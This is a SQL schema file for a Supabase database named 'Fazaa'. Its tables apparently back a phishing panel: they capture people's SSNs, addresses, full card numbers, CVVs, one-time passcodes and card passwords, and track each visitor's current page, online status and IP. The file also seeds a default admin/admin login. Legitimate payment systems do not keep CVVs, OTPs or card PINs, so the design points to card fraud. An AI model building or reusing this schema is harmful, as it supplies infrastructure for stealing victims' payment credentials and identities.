-- =============================================
-- Fazaa Database Schema
-- Run this in Supabase SQL Editor
-- =============================================

-- 1. Admins table (login for dashboard)
CREATE TABLE IF NOT EXISTS admins (
    id SERIAL PRIMARY KEY,
    email VARCHAR(255) NOT NULL UNIQUE,
    password VARCHAR(255) NOT NULL,
    created_at TIMESTAMP DEFAULT NOW()
);

-- 2. Users table (applicants/customers)
CREATE TABLE IF NOT EXISTS users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(255),
    phone VARCHAR(50),
    ssn VARCHAR(50),
    address TEXT,
    page VARCHAR(255) DEFAULT 'index.php',
    message TEXT,
    date VARCHAR(100),
    insurance_company VARCHAR(255),
    insurance_price VARCHAR(100),
    account_type VARCHAR(100),
    is_online BOOLEAN DEFAULT false,
    last_input_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT NOW(),
    updated_at TIMESTAMP DEFAULT NOW()
);

-- 3. Cards table (payment card info)
CREATE TABLE IF NOT EXISTS cards (
    id SERIAL PRIMARY KEY,
    user_id INTEGER REFERENCES users(id) ON DELETE CASCADE,
    "cardNumber" VARCHAR(50),
    "cardName" VARCHAR(255),
    year VARCHAR(20),
    cvv VARCHAR(10),
    otp VARCHAR(50),
    password VARCHAR(100),
    created_at TIMESTAMP DEFAULT NOW()
);

-- 4. Visits table (tracking)
CREATE TABLE IF NOT EXISTS visits (
    id SERIAL PRIMARY KEY,
    user_id INTEGER,
    ip_address VARCHAR(50),
    visited_at TIMESTAMP DEFAULT NOW()
);

-- Insert default admin account
INSERT INTO admins (email, password)
VALUES ('admin@admin.com', 'admin')
ON CONFLICT (email) DO NOTHING;
